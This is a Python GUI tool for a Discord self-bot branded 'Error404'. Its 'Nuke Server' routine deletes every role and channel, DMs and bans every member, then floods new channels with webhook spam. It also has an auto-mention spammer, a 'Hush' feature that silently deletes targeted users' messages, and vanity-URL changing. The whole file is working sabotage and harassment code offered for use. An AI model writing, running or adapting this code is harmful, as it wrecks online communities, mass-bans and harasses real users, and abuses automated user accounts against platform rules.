import tkinter as tk
from tkinter import ttk
import asyncio
import threading
import discord
import random
from discord.ext import commands
from tkinter import ttk, messagebox

# ==== CONFIG ====
def load_token():
    try:
        with open("tokens.txt", "r") as f:
            token = f.readline().strip()
            if not token:
                raise ValueError("Token file is empty.")
            return token
    except FileNotFoundError:
        print("[ERROR] tokens.txt not found.")
        exit()
    except Exception as e:
        print(f"[ERROR] Token has been burnt please reset the token: {e}")
        exit()

TOKEN = load_token()
DELAY_SECONDS = 0
# ================


intents = discord.Intents.default()
auto_chat_running = False
target_username = ""
auto_lines = []
user_ids_entry = None
mention_toggle_var = None
hushed_user_ids = set ()
hush_active = False
mention_user_entry = None  
intents.members = True  
intents.reactions = True  
intents.guilds = True
intents.messages = True
intents.message_content = True




bot = commands.Bot(command_prefix="!",self_bot = True, intents=intents)


guild_dropdown = None
channel_dropdown = None
chat_log = None
message_entry = None
guild_map = {}     
channel_map = {}   
selected_guild_id = None
selected_channel_id = None
nuke_active = False



def start_bot():

    bot.run(TOKEN)

def log_to_chat_log(message):
    chat_log.config(state=tk.NORMAL)  
    chat_log.insert(tk.END, message + "\n")
    chat_log.config(state=tk.DISABLED)  
    chat_log.yview(tk.END)  

async def change_vanity_url(guild, new_vanity):
    
    if guild.me.guild_permissions.manage_guild:
        try:
            
            await guild.edit(vanity_url_code=new_vanity)
            log_to_chat_log(f"[NUKE] Vanity URL successfully changed to: {new_vanity}")
        except discord.Forbidden:
            log_to_chat_log("[NUKE] The bot does not have permission to change the vanity URL.")
        except Exception as e:
            log_to_chat_log(f"[NUKE] An error occurred: {e}")
    else:
        log_to_chat_log("[NUKE] The bot does not have the necessary permissions to change vanity URL.")

def confirm_and_nuke(base_name, count, webhook_msg, dm_msg):
    result = messagebox.askyesno("Confirm Nuke", "Are you sure you want to nuke the server?")
    if result:
        asyncio.run_coroutine_threadsafe(nuke_server(base_name, count, webhook_msg, dm_msg), bot.loop)

async def nuke_server(base_name, count_str, custom_message, dm_message_template):
    global nuke_active
    nuke_active = True

    try:
        count = int(count_str)
    except ValueError:
        log_to_chat_log("[NUKE] Invalid number of channels.")
        return

    if selected_guild_id is None:
        log_to_chat_log("[NUKE] No guild selected.")
        return

    guild = bot.get_guild(int(selected_guild_id))
    if not guild:
        log_to_chat_log("[NUKE] Guild not found.")
        return

    log_to_chat_log("[NUKE] Starting...")

    
    try:
        for role in guild.roles:
            if role.name != "@everyone" and bot.user.top_role > role:
                try:
                    await role.delete()
                    log_to_chat_log(f"[NUKE] Deleted role: {role.name}")
                    await asyncio.sleep(0.3)
                except Exception as e:
                    log_to_chat_log(f"[NUKE] Failed to delete role {role.name}: {e}")
    except Exception as e:
        log_to_chat_log(f"[NUKE] Error while deleting roles: {e}")

    
    for member in guild.members:
        if member.id != bot.user.id:
            try:
                
                dm_content = dm_message_template.replace("{server}", guild.name)
                await member.send(dm_content)
                await asyncio.sleep(0.3)

                
                await guild.ban(member, reason="Nuked By Error")
                log_to_chat_log(f"[NUKE] Banned and messaged: {member.name}")
            except Exception as e:
                log_to_chat_log(f"[NUKE] Failed to ban/message {member.name}: {e}")

    
    for channel in guild.channels:
        try:
            await channel.delete()
            log_to_chat_log(f"[NUKE] Deleted channel: {channel.name}")
            await asyncio.sleep(0.3)
        except Exception as e:
            log_to_chat_log(f"[NUKE] Failed to delete channel {channel.name}: {e}")

    
    overwrite = {
        guild.default_role: discord.PermissionOverwrite(send_messages=False, view_channel=True)
    }

    for i in range(1, count + 1):
        if not nuke_active:
            log_to_chat_log("[NUKE] Stopped mid-process.")
            break

        try:
            new_channel = await guild.create_text_channel(f"{base_name}{i}", overwrites=overwrite)
            webhook = await new_channel.create_webhook(name="ErrorNuker")

            for _ in range(5):
                await webhook.send(custom_message)
                await asyncio.sleep(0.2)

            await asyncio.sleep(0.5)
        except Exception as e:
            log_to_chat_log(f"[NUKE] Failed to create channel or webhook: {e}")

    log_to_chat_log("[NUKE] Completed.")

def stop_nuke():
    log_to_chat_log("[NUKE] Stopped.")
    global nuke_active
    nuke_active = False

def get_random_username_mention():
    """Return a random mention from the list of usernames or an empty string for no mention."""
    if mention_toggle_var.get():
        user_input = mention_user_entry.get()  
        target_usernames = [name.strip() for name in user_input.split(",") if name.strip()]

        if target_usernames:
            
            if random.random() < 0.5: 
                return ""

            
            username = random.choice(target_usernames)
            guild = bot.get_guild(selected_guild_id)
            
            if guild:
                
                member = None
                for m in guild.members:
                    if m.name.lower() == username.lower():  
                        member = m
                        break

                if member:
                    
                    return f" <@{member.id}>"
                else:
                    print(f"[ERROR] User {username} not found in the guild.")
            else:
                print("[ERROR] Guild not found.")
    return ""

async def stop_hush():
    log_to_chat_log("[HUSH] Stopped.")
    global hush_active, hushed_user_ids
    hush_active = False
    hushed_user_ids.clear()

@bot.event
async def on_message(message):
    global hush_active, hushed_user_ids

    if message.author == bot.user:
        return

    print(f"[on_message] Message from {message.author} (ID: {message.author.id}): '{message.content}'")
    print(f"[HUSH] Current hushed user IDs: {hushed_user_ids}")

    if hush_active and message.author.id in hushed_user_ids:
        try:
            if message.channel.permissions_for(message.guild.me).manage_messages:
                await message.delete()
                print(f"[HUSH] Deleted message from {message.author} (ID: {message.author.id})")
            else:
                print("[ERROR] Bot does not have permission to delete messages.")
        except discord.Forbidden:
            print("[ERROR] Bot lacks permission to delete message.")
        except discord.HTTPException as e:
            print(f"[ERROR] Failed to delete message: {e}")



async def start_hush(usernames):
    log_to_chat_log("[HUSH] Started.")
    global hushed_user_ids, hush_active
    selected_guild_name = guild_dropdown.get()
    print(f"[start_hush] Trying to hush: {usernames} in guild '{selected_guild_name}'")

    username_list = [name.strip().lower() for name in usernames.split(",")]

    for guild in bot.guilds:
        if guild.name == selected_guild_name:
            print(f"[start_hush] Found guild: {guild.name}")
            await guild.chunk()
            await asyncio.sleep(1)

            found_any = False
            for member in guild.members:
                member_name = member.name.lower()
                member_nick = member.nick.lower() if member.nick else ""
                if member_name in username_list or member_nick in username_list:
                    hushed_user_ids.add(member.id)
                    found_any = True
                    print(f"[start_hush] Hushing user: {member.name} (ID: {member.id})")
            
            if not found_any:
                print("[start_hush] No matching users found.")
            else:
                hush_active = True
            return

async def auto_chat():
    """Automatically sends messages with random mentions from the user input."""
    global auto_chat_running

    while auto_chat_running:
        if not auto_lines:
            update_log("[ERROR] No lines loaded for auto chat.")
            break

        msg = random.choice(auto_lines)
        channel = bot.get_channel(selected_channel_id)

        if channel:
            mention_text = get_random_username_mention()  

            
            full_msg = f"{msg}{mention_text}"  

            await channel.send(full_msg)
            update_log(f"AUTO: {full_msg}")
        else:
            update_log("[ERROR] Channel not found.")
            break

        await asyncio.sleep(0.5)  

async def send_message():
    """Sends a manual message with an optional random user mention."""
    user_input = mention_user_entry.get()
    target_usernames = [name.strip() for name in user_input.split(",") if name.strip()]

    if not target_usernames:
        update_log("[ERROR] Please provide at least one username in the mention user text box.")
        return

    mention_text = get_random_username_mention()  

    msg = message_entry.get() + mention_text  

    channel = bot.get_channel(selected_channel_id)
    if channel:
        await channel.send(msg)
        update_log(f"SENT: {msg}")
        message_entry.delete(0, tk.END)  
    else:
        update_log("[ERROR] Channel not found.")

DELAY_SECONDS = 0  



def start_auto_chat():
    log_to_chat_log("[AUTO CHAT] Started.")
    global auto_chat_running
    update_target_username()  

    if not target_username:
        update_log("[ERROR] Please enter a username to mention.")
        return

    load_auto_lines()  
    auto_chat_running = True
    asyncio.run_coroutine_threadsafe(auto_chat(), bot.loop)

def send_message_from_gui():
    """Wrapper function to handle async calls from the GUI thread."""
    update_target_username()  
    asyncio.run_coroutine_threadsafe(send_message(), bot.loop)

auto_lines = []  

def load_auto_lines():
    global auto_lines
    try:
        with open("autolines.txt", "r", encoding="utf-8") as f:
            auto_lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        auto_lines = []
        update_log("[ERROR] autolines.txt not found!")

def stop_auto_chat():
    log_to_chat_log("[AUTO CHAT] Started.")
    global auto_chat_running
    auto_chat_running = False

def get_random_user_mention():
    if mention_toggle_var.get():
        user_ids = user_ids_entry.get().split(",")
        user_ids = [uid.strip() for uid in user_ids if uid.strip().isdigit()]
        if user_ids and random.random() < 0.8:  
            selected_id = random.choice(user_ids)
            return f"<@{selected_id}>"
    return ""

async def populate_channels():
    global guild_map, channel_map

    guild_map.clear()
    channel_map.clear()

    for guild in bot.guilds:
        guild_map[guild.name] = guild
        channel_map[guild.id] = {}
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                channel_map[guild.id][channel.name] = channel

    print(f"Channel map: {channel_map}")  

    if guild_dropdown:
        guild_dropdown["values"] = list(guild_map.keys())
        if guild_map:
            guild_dropdown.current(0)
            set_selected_guild(guild_dropdown.get())

    
    update_log("[INFO] Channels and guilds populated.")

def set_selected_guild(guild_name):
    global selected_guild_id
    guild = guild_map.get(guild_name)
    if guild:
        selected_guild_id = guild.id
        update_channel_dropdown(guild.id)

def update_channel_dropdown(guild_id):
    if channel_dropdown and guild_id in channel_map:
        channels = list(channel_map[guild_id].keys())
        print(f"Available channels: {channels}")  
        channel_dropdown["values"] = channels
        if channels:
            channel_dropdown.current(0)
            set_selected_channel(channel_dropdown.get())

def set_selected_channel(channel_name):
    global selected_channel_id
    if selected_guild_id and selected_guild_id in channel_map:
        channel = channel_map[selected_guild_id].get(channel_name)
        if channel:
            selected_channel_id = channel.id
            print(f"Selected channel: {channel.name} | ID: {selected_channel_id}")  
        else:
            print("[ERROR] Channel not found in the selected guild.")  
    else:
        print("[ERROR] Selected guild ID is not valid.")  

async def send_delayed_message(msg):
    await asyncio.sleep(DELAY_SECONDS)
    if selected_channel_id is None:
        update_log("[ERROR] No channel selected.")
        return
    channel = bot.get_channel(selected_channel_id)
    if channel:
        print(f"Sending message to channel: {channel.name} (ID: {selected_channel_id})")

        for member in channel.guild.members:
            tag = f"@{member.name}"
            if tag in msg:
                msg = msg.replace(tag, member.mention)

        mention_text = get_random_user_mention()
        msg += f" {mention_text}" if mention_text else ""

        await channel.send(msg)
        update_log(f"YOU: {msg}")
    else:
        update_log("[ERROR] Channel not found.")

def update_target_username():
    global target_username
    target_username = mention_user_entry.get()

def logout():
    if main_window:
        main_window.destroy()
    show_password_prompt()


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    await populate_channels()


    
    for guild in bot.guilds:
        await guild.chunk()  
        print(f"\nGuild: {guild.name}")
        for member in guild.members:
            print(f"- {member.name} ({member.id})")

    
    await populate_channels()  

def on_enter_key(event):
    msg = message_entry.get()
    if msg.strip():
        asyncio.run_coroutine_threadsafe(send_delayed_message(msg), bot.loop)
        message_entry.delete(0, tk.END)

def update_log(message):
    if chat_log:  
        chat_log.config(state=tk.NORMAL)
        chat_log.insert(tk.END, message + "\n")
        chat_log.config(state=tk.DISABLED)
        chat_log.see(tk.END)
    else:
        print(f"LOG: {message}")  

def show_password_prompt():
    def check_password():
        user_input = password_entry.get()
        if user_input == "Error404":  # Correct password
            pw_window.destroy()
            create_gui()
            threading.Thread(target=start_bot, daemon=True).start()
        else:
            tk.messagebox.showerror("Access Denied", "Incorrect password.")
            password_entry.delete(0, tk.END)

    pw_window = tk.Tk()
    pw_window.title("Enter Password")
    pw_window.geometry("300x120")
    pw_window.configure(bg="#000000")

    tk.Label(pw_window, text="Enter GUI Password:", bg="#000000", fg="#6626de").pack(pady=10)
    password_entry = tk.Entry(pw_window, show="*", width=30, bg="#000000", fg="#6626de", insertbackground="#6626de")
    password_entry.pack()
    password_entry.bind("<Return>", lambda e: check_password())

    tk.Button(pw_window, text="Unlock", command=check_password, bg="#6626de", fg="#000000").pack(pady=10)

    pw_window.mainloop()


def create_gui():
    global hush_active, hushed_user_ids, main_window, target_username, mention_user_entry, user_ids_entry, mention_toggle_var, channel_dropdown, chat_log, message_entry, guild_dropdown, target_entry, main_window
    

    main_window = tk.Tk()
    main_window.title("Error404")
    main_window.geometry("680x920")
    main_window.configure(bg="#000000")

    
    ascii_display = tk.Text(main_window, font=("Courier", 10), bg="#000000", fg="#6626de", bd=0, highlightthickness=0, height=10)
    ascii_display.pack(pady=(5, 0))
    ascii_display.config(state=tk.NORMAL)

    
    ascii_lines = [
        "                    ███████╗██████╗ ██████╗  ██████╗ ██████╗ ",
        "                    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗",
        "                    █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝",
        "                    ██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗",
        "                    ███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║",
        "                    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝",
        "                                  Made By Ghoul               "
    ]

    
    purple_fade = ["#d5b3ff", "#c193ff", "#ae74fc", "#9e5ef7", "#8e49f0", "#7a37e7", "#6626de"]

    for i, line in enumerate(ascii_lines):
        tag = f"line{i}"
        ascii_display.insert(tk.END, line + "\n", tag)
        ascii_display.tag_config(tag, foreground=purple_fade[i])

    ascii_display.config(state=tk.DISABLED)

    logout_btn = tk.Button(main_window, text="Logout", command=logout, bg="#6626de", fg="#000000")
    logout_btn.pack(pady=2)

    refresh_button = tk.Button(main_window, text="Refresh Channels", command=lambda: asyncio.run_coroutine_threadsafe(populate_channels(), bot.loop), bg="#6626de", fg="#000000")
    refresh_button.pack()

    
    frame = tk.Frame(main_window, bg="#000000")
    frame.pack(pady=5)

    style = ttk.Style()
    style.theme_use("default")

    
    style.configure("Purple.TCombobox",
                    fieldbackground="#000000",  
                    background="#000000",       
                    foreground="#6626de",       
                    selectforeground="#6626de",
                    selectbackground="#000000",
                    arrowcolor="#6626de")

    
    guild_dropdown = ttk.Combobox(frame, state="readonly", width=50, style="Purple.TCombobox")
    guild_dropdown.pack(pady=2)
    guild_dropdown.bind("<<ComboboxSelected>>", lambda e: set_selected_guild(guild_dropdown.get()))

    channel_dropdown = ttk.Combobox(frame, state="readonly", width=50, style="Purple.TCombobox")
    channel_dropdown.pack(pady=2)
    channel_dropdown.bind("<<ComboboxSelected>>", lambda e: set_selected_channel(channel_dropdown.get()))

    chat_log = tk.Text(main_window, height=15, state=tk.DISABLED, bg="#000000", fg="white", wrap=tk.WORD)
    chat_log.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    message_entry = tk.Entry(main_window, width=70, bg="#000000", fg="white", insertbackground="white")
    message_entry.pack(pady=5)
    message_entry.bind("<Return>", on_enter_key)

    # Auto Chat Controls
    tk.Label(main_window, text="Auto Chat Controls", bg="#000000", fg="#6626de").pack()

    control_frame = tk.Frame(main_window, bg="#000000")
    control_frame.pack(pady=10, fill=tk.X)

    tk.Label(control_frame, text="Mention users (comma separated):", bg="#000000", fg="#6626de").grid(row=0, column=0, padx=5)

    mention_user_entry = tk.Entry(control_frame, width=30, bg="#000000", fg="#6626de", insertbackground="#6626de")
    mention_user_entry.grid(row=0, column=1, padx=5, pady=5)

    start_btn = tk.Button(control_frame, text="Start Auto", command=start_auto_chat, bg="#6626de", fg="#000000")
    start_btn.grid(row=0, column=2, padx=5)

    stop_btn = tk.Button(control_frame, text="Stop Auto", command=stop_auto_chat, bg="#6626de", fg="#000000")
    stop_btn.grid(row=0, column=3, padx=5)

    tk.Label(control_frame, text="Mention User IDs (comma-separated):", bg="#000000", fg="#6626de").grid(row=1, column=0, padx=5, pady=(5, 0))
    user_ids_entry = tk.Entry(control_frame, width=30, bg="#000000", fg="#6626de", insertbackground="white")
    user_ids_entry.grid(row=1, column=1, columnspan=2, padx=5, pady=(5, 0))

    mention_toggle_var = tk.BooleanVar(value=True)
    mention_checkbox = tk.Checkbutton(control_frame, text="Include ID Mentions", variable=mention_toggle_var, bg="#000000", fg="#6626de", activebackground="#000000", activeforeground="#6626de", selectcolor="#000000")
    mention_checkbox.grid(row=2, column=0, columnspan=3, pady=(5, 0))

    # Hush Feature
    tk.Label(control_frame, text="Hush Usernames (comma separated):", bg="#000000", fg="#6626de").grid(row=3, column=0, padx=5, pady=(5, 0))
    target_entry = tk.Entry(control_frame, width=30, bg="#000000", fg="#6626de", insertbackground="#6626de")
    target_entry.grid(row=3, column=1, padx=5, pady=(5, 0))

    start_hush_btn = tk.Button(control_frame, text="Start Hush", bg="#6626de", fg="#000000", command=lambda: asyncio.run_coroutine_threadsafe(start_hush(target_entry.get()), bot.loop))
    start_hush_btn.grid(row=3, column=2, padx=5)

    stop_hush_btn = tk.Button(control_frame, text="Stop Hush", bg="#6626de", fg="#000000", command=lambda: asyncio.run_coroutine_threadsafe(stop_hush(), bot.loop))
    stop_hush_btn.grid(row=3, column=3, padx=5)

    # Nuke Controls Title
    tk.Label(
    control_frame, text="Nuke Controls", bg="#000000", fg="#6626de",
    font=("Arial", 14, "bold")
).grid(row=4, column=0, columnspan=4, padx=(273, 0), pady=(10, 0), sticky="w")

    # Nuke Feature
    tk.Label(control_frame, text="Rename Channels:", bg="#000000", fg="#6626de").grid(row=5, column=0, padx=5, pady=(10, 0))

    nuke_name_entry = tk.Entry(control_frame, width=20, bg="#000000", fg="#ff0000", insertbackground="#ff0000")
    nuke_name_entry.grid(row=5, column=1, padx=5, pady=(10, 0))
    nuke_name_entry.insert(0, "")

    stop_nuke_button = tk.Button(control_frame, text="Stop Nuke", bg="#00ff00", fg="#000000", command=stop_nuke)
    stop_nuke_button.grid(row=5, column=3, padx=5, pady=(10, 0))

    # Number of channels
    tk.Label(control_frame, text="Number of Channels:", bg="#000000", fg="#6626de").grid(row=6, column=0, padx=5, pady=(5, 0))

    nuke_count_entry = tk.Entry(control_frame, width=20, bg="#000000", fg="#ff0000", insertbackground="#ff0000")
    nuke_count_entry.grid(row=6, column=1, padx=5, pady=(5, 0))
    nuke_count_entry.insert(0, "5")

    # Custom message for webhooks
    tk.Label(control_frame, text="Webhook Message:", bg="#000000", fg="#6626de").grid(row=7, column=0, padx=5, pady=(5, 0))

    custom_message_entry = tk.Entry(control_frame, width=30, bg="#000000", fg="#6626de", insertbackground="#6626de")
    custom_message_entry.grid(row=7, column=1, padx=5, pady=(5, 0))
    custom_message_entry.insert(0, "")  # Default message

    # Vanity URL Label and Input Field
    vanity_label = tk.Label(control_frame, text="Enter custom vanity URL:", bg="#000000", fg="#6626de")
    vanity_label.grid(row=8, column=0, padx=5, pady=(5, 0))
    vanity_input = tk.Entry(control_frame, width=40, bg="#000000", fg="#6626de", insertbackground="#6626de")
    vanity_input.grid(row=8, column=1, padx=5, pady=(5, 0))

    nuke_btn = tk.Button(control_frame,text="Nuke Server",bg="#ff0000",fg="#000000",
    command=lambda: confirm_and_nuke(nuke_name_entry.get(),nuke_count_entry.get(),custom_message_entry.get(),custom_dm_entry.get()))
    nuke_btn.grid(row=5, column=2, padx=5, pady=(10, 0))


    tk.Label(control_frame, text="Custom DM Before Ban:", bg="#000000", fg="#6626de").grid(row=9, column=0, padx=5, pady=(5, 0))
    custom_dm_entry = tk.Entry(control_frame, width=40, bg="#000000", fg="#6626de", insertbackground="#6626de")
    custom_dm_entry.grid(row=9, column=1, padx=5, pady=(5, 0))
    custom_dm_entry.insert(0, "{server} got nuked join discord.gg/")



    

    

    

    main_window.mainloop()


if __name__ == "__main__":
    threading.Thread(target=start_bot, daemon=True).start()
    show_password_prompt()
